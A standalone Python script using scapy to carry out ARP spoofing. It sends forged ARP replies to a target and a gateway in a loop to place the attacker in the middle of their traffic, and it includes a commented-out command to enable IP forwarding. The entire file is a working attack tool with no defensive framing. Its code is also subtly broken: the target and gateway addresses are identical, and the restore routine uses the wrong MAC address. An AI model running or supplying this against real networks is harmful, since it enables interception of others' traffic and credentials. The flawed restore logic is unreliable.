#!/usr/bin/env python
import subprocess
import time
import scapy.all as scapy

target_ip = '10.0.2.15'
gateway_ip = '10.0.2.15'


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target, hwdst=get_mac(target), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(destination_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


def spoofing():
    # TODO: Debug subprocess
    # subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward')
    sent_packets_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count = sent_packets_count + 2
            print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\r[+] Detected CTRL + C, Resetting ARP tables, please wait...', end='')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)


spoofing()
